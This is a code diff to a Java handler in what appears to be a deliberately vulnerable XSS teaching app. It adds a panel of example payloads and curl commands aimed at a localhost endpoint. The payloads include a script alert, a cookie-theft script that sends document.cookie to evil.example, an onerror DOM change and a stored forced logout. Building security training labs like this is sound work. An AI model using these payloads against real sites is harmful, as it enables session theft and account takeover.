@@ -10,7 +10,7 @@ public class XssHandler implements IRouteHandler {
 
     @Override
     public void handle(HttpServletRequest req, HttpServletResponse res) throws IOException {
-        String path = req.getServletPath();
+        String path = req.getPathInfo();
 
         if ("POST".equals(req.getMethod()) && "/xss/vulnerable".equals(path)) {
             handleVulnerable(req, res);
@@ -91,7 +91,22 @@ public class XssHandler implements IRouteHandler {
                 TemplateEngine.demoPanel("Mitigated — HTML Encoding", "green", safeForm, "")
             );
 
-        String content = TemplateEngine.vulnerabilityBadge("A03", "Injection — Cross-Site Scripting (XSS)") + info + panels;
+        String exploits = TemplateEngine.exploitBox(new String[][]{
+            {"Basic alert", "<script>alert('XSS')</script>",
+             "Classic proof-of-concept — pops an alert box in the victim's browser.", "comment",
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>alert('XSS')</script>\""},
+            {"Cookie theft", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>",
+             "Exfiltrates the session cookie to an attacker-controlled server.", "comment",
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>document.location='http://evil.example/steal?c='+document.cookie</script>\""},
+            {"DOM manipulation", "<img src=x onerror=\"document.body.style.background='red'\">",
+             "Uses an invalid src to trigger onerror, then alters the page DOM.", "comment",
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'comment=<img src=x onerror=alert(1)>'"},
+            {"Stored payload", "<script>fetch('/logout')</script>",
+             "Silently logs out any visitor who views the comment — a stored XSS action.", "comment",
+             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>fetch('/logout')</script>\""},
+        });
+
+        String content = TemplateEngine.vulnerabilityBadge("A03", "Injection — Cross-Site Scripting (XSS)") + info + exploits + panels;
         res.getWriter().write(TemplateEngine.page("XSS", content, true));
     }
 }
